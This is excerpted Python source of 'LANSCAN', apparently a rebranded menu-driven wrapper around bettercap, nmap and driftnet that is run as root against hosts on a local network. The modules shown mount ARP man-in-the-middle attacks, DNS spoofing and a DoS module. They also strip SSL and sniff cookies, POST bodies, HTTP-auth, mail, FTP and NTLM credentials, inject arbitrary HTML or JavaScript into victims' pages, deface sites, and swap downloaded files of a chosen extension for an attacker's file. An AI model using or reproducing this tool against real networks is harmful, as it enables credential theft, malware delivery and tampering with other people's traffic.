...
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] LANSCAN must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")
...
#Configure the network interface and gateway. 
		def config0():
			global up_interface
			up_interface = open('/opt/lanscan/tools/files/iface.txt', 'r').read()
			...
			global gateway
			gateway = open('/opt/lanscan/tools/files/gateway.txt', 'r').read()
...
# Show a random banner. Configured in banner.py .  
			...
			print ("""
[+]═══════════[ Author : @Mr.WHITEHOST \033[1;36m_-\|/-_\033[1;m ]═══════════[+]

                      [ Powered by Bettercap , Nmap and BITSATHY  ]""")

			print(""" \033[1;36m
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration by 171CS256              █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")
		...
		def scan(): 
			...
			f = open('/opt/lanscan/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/lanscan/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/lanscan/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/lanscan/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
		...
		def target_ip():
			...
			target_ips = raw_input("\033[1;36m\033[4m256@\033[0m\033[1;36m ➮ \033[1;m").strip()
...
#modules section
			def program0():
				...
				def option():
					...
					options = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
					# Port scanner
					if options == "pscan":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							...
							action_pscan = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
							if action_pscan == "back":
								...
								save_pscan = open('/opt/lanscan/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/lanscan/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/lanscan/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/lanscan/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/lanscan/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							...
							action_dos = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():
							...
							action_ping = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 
							...
							if action_ping == "back":
								...
								fping = open('/opt/lanscan/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/lanscan/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/lanscan/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/lanscan/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/lanscan/tools/log/ping.txt | awk '{print $10}'").read()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_html():
							...
							action_inject = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_inject == "back":
								...
								html_file = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
								...
								if html_file == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_code = os.system("cp " + html_file + " /opt/lanscan/tools/bettercap/modules/tmp/file.html")
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/lanscan/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							...
							action_rdownload = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_rdownload == "back":
								...
								module = "/opt/lanscan/tools/bettercap/modules/http/replace_file.rb"
								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
								ext_rdownload = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
								file_rdownload = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m")
								...
								if file_rdownload == "back":
									...
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/lanscan/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
									rdownload()						
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								rdownload()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						...
						def snif():
							...
							action_snif = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
								...
								def snif_sslstrip():
									...
									action_snif_sslstrip = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/lanscan/256@sniff \033[1;m")
										...
										make_file = os.system("mkdir -p /opt/lanscan/256@sniff && cd /opt/lanscan/256@sniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'lanscan' -hold -e "tail -f /opt/lanscan/256@sniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/lanscan/256@sniff/" + filename + ".log --sniffer-output /opt/lanscan/256@sniff/" + filename + ".pcap")
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/lanscan/256@sniff/" + filename + ".*")
										...
										make_file = os.system("mkdir -p /opt/lanscan/256@sniff && cd /opt/lanscan/256@sniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'lanscan' -hold -e "tail -f /opt/lanscan/256@sniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/lanscan/256@sniff/" + filename + ".log --sniffer-output /opt/lanscan/256@sniff/" + filename + ".pcap")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							...
							action_dspoof = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								...
								action_dspoof_ip = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								dns_conf = action_dspoof_ip + " .*\.*"
								outdns = open('/opt/lanscan/tools/files/dns.conf','w')
								...
								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/lanscan/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							...
							action_yplay = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_yplay == "back":
								...
								video_id = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
								if video_id == "back":
									option()
									...
									code_yplay = open('/opt/lanscan/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/lanscan/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
									yplay()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								yplay()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def replace():
							...
							action_replace = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_replace == "back":
								...
								img_replace = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
								...
								if img_replace == "back":
									...
									img.save('/opt/lanscan/tools/bettercap/modules/tmp/ximage.png')
									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									

									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/lanscan/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/lanscan/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							...
							action_driftnet = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_driftnet == "back":
								...
								print("\033[1;34m\n[++] All captured images will be temporarily saved in /opt/lanscan/xedriftnet \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p /opt/lanscan/xedriftnet && driftnet -d /opt/lanscan/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("rm -R /opt/lanscan/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							...
							action_shakescreen = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_shakescreen == "back":
								...
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/lanscan/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
								shakescreen()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								shakescreen()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_j():
							...
							action_inject_j = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_inject_j == "back":
								...
								js_file = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
...
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def deface():
							...
							action_deface = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_deface == "back":
								...
								file_deface = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
								...
								if file_deface == "back":
									...
									f1 = open('/home/home/256@-html.html','w')
									f1.write(content)
									f1.close()

									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/lanscan/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/256@-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()
...
deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
		...
		def cmd0():
			while True:
				...
				cmd_0 = raw_input("\033[1;36m\033[4m256@\033[0m\033[1;36m ➮ \033[1;m").strip()
				if cmd_0 == "scan": # Map the network
					...
					def gateway():
						...
						n_gateway = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
						...
						if n_gateway == "back":
							...
							s_gateway = open('/opt/lanscan/tools/files/gateway.txt','w')
					...
					def iface():
						...
						n_up_interface = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()
						...
						if n_up_interface == "back":
							...
							s_up_interface = open('/opt/lanscan/tools/files/iface.txt','w')
					...
					def rm_log():
						print("\033[1;32m\n[+] Do want to remove all lanscan logs ? (y/n)\n\033[1;m")
						cmd_rmlog = raw_input("\033[1;36m\033[4m256@\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/lanscan/256@sniff/ /opt/lanscan/tools/log/* /opt/lanscan/tools/bettercap/modules/tmp/* /opt/lanscan/tools/files/dns.conf")
